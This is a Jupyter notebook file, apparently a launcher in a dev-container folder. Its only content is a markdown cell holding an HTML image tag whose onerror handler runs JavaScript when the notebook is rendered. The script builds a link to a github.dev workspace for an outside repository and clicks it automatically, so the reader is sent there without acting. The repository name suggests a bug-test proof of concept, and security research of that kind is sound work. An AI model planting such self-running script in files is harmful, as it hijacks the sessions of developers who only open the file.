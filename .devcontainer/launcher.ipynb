{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=\"x\" onerror='link = document.createElement(\"a\"); link.target = \"_blank\"; link.href = \"https://github.dev/ammaraskar-bug-test/public-repo-2\"; document.body.appendChild(link); console.log(link); link.click();'>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
